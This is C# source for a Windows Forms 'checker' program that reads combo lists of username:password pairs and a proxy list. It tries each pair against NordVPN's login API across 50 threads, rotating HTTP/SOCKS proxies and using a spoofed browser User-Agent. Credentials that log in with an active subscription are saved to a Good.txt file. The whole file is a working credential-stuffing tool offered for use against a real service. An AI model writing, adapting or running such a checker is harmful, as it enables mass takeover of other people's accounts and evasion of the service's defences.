using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Checker_by_RequestFX
{
    static class Program
    {
        public static string Date = "Results\\Result " + DateTime.Now.ToString("dd-MM-yyyy(hh;mm;ss)");
        public static List<string> comboList = new List<string>();
        public static List<string> proxyList = new List<string>();
        public static bool running = true, rainbow = false;
        public static float f = 0;

        public static string proxyType = "HTTP", Hits = "";
        public static string[] AccountDetails;
        public static int ccount, pcount,
        combonumber, proxynumber,
        thread = 50,
        good,
        bad,
        check,
        retry,
        error;

        [STAThread]
        public static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }

        public static void TextFile(string Name)
        {
            string s;
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.DefaultExt = "txt";
            openFileDialog.Filter = "Text files|*.txt";
            openFileDialog.RestoreDirectory = true;

            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                s = openFileDialog.FileName;
                if (Name.Equals("combo"))
                {
                    ccount = 0;
                    comboList = new List<string>((IEnumerable<string>)File.ReadAllLines(s));
                }
                else
                {
                    pcount = 0;
                    proxyList = new List<string>((IEnumerable<string>)File.ReadAllLines(s));
                }
                using (FileStream fileStream = File.Open(s, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    using (BufferedStream bufferedStream = new BufferedStream((Stream)fileStream))
                    {
                        using (StreamReader streamReader = new StreamReader((Stream)bufferedStream))
                        {
                            if (Name.Equals("combo"))
                                while (streamReader.ReadLine() != null)
                                    ++ccount;
                            else while (streamReader.ReadLine() != null)
                                    ++pcount;
                        }
                    }
                }
            }
        }


        public static Color Rainbow(float progress)
        {
            float div = (Math.Abs(progress % 1) * 6);
            int ascending = (int)((div % 1) * 255);
            int descending = 255 - ascending;

            progress += 0.01f;

            switch ((int)div)
            {
                case 0:
                    return Color.FromArgb(255, 255, ascending, 0);
                case 1:
                    return Color.FromArgb(255, descending, 255, 0);
                case 2:
                    return Color.FromArgb(255, 0, 255, ascending);
                case 3:
                    return Color.FromArgb(255, 0, descending, 255);
                case 4:
                    return Color.FromArgb(255, ascending, 0, 255);
                default: // case 5:
                    return Color.FromArgb(255, 255, 0, descending);
            }
        }

        public static void Check()
        {
            while (running == true)
            {
                if (Program.proxynumber > Program.proxyList.Count<string>() - 2)
                    Program.proxynumber = 0;
                try
                {
                    Interlocked.Increment(ref Program.proxynumber);
                    using (HttpRequest httpRequest = new HttpRequest())
                    {
                        if (Program.combonumber >= Program.comboList.Count<string>())
                        {
                            break;
                        }
                        Interlocked.Increment(ref Program.combonumber);
                        Program.AccountDetails = Program.comboList[Program.combonumber].Split(':');
                        try
                        {
                            httpRequest.IgnoreProtocolErrors = true;
                            httpRequest.KeepAlive = true;
                            if (Program.proxyType == "HTTP")
                                httpRequest.Proxy = (ProxyClient)HttpProxyClient.Parse(Program.proxyList[Program.proxynumber]);
                            if (Program.proxyType == "SOCKS4")
                                httpRequest.Proxy = (ProxyClient)Socks4ProxyClient.Parse(Program.proxyList[Program.proxynumber]);
                            if (Program.proxyType == "SOCKS5")
                                httpRequest.Proxy = (ProxyClient)Socks5ProxyClient.Parse(Program.proxyList[Program.proxynumber]);
                            httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36");
                            httpRequest.AddHeader("Accept", "*/*");
                            string data = httpRequest.Post("https://api.nordvpn.com/v1/users/tokens", "{\"username\":\"" + Program.AccountDetails[0] + "\",\"password\":\"" + Program.AccountDetails[1] + "\"}", "application/json").ToString();
                            if (data.Contains("user_id\":"))
                            {
                                string str2 = Program.Base64Encode("token:" + Utils.LRParse(data, "token\":\"", "\"", false, false));
                                httpRequest.AddHeader("Authorization", "Basic " + str2);
                                if (DateTime.Compare(Convert.ToDateTime(DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")), Convert.ToDateTime(Utils.LRParse(httpRequest.Get("https://api.nordvpn.com/v1/users/services", (RequestParams)null).ToString(), "expires_at\":\"", "\"", false, false))) < 0)
                                {
                                    ++Program.check;
                                    ++Program.good;
                                    using (StreamWriter sw = File.AppendText(Program.Date + "\\Good.txt"))
                                        sw.WriteLine(Program.AccountDetails[0] + ":" + Program.AccountDetails[1]);
                                }
                                else
                                {
                                    ++Program.check;
                                    ++Program.bad;
                                }
                            }
                            else if (data.Contains("code\":101301"))
                            {
                                ++Program.check;
                                ++Program.bad;
                            }
                            else if (data.Contains("message\":\"Unauthorized"))
                            {
                                ++Program.check;
                                ++Program.bad;
                            }
                            else
                            {
                                ++Program.error;
                                Program.comboList.Add(Program.AccountDetails[0] + ":" + Program.AccountDetails[1]);
                            }
                        }
                        catch (Exception ex)
                        {
                            ++Program.error;
                            Program.comboList.Add(Program.AccountDetails[0] + ":" + Program.AccountDetails[1]);
                        }
                    }
                }
                catch (Exception ex)
                {
                    ++Program.error;
                }
            }
        }
    }
}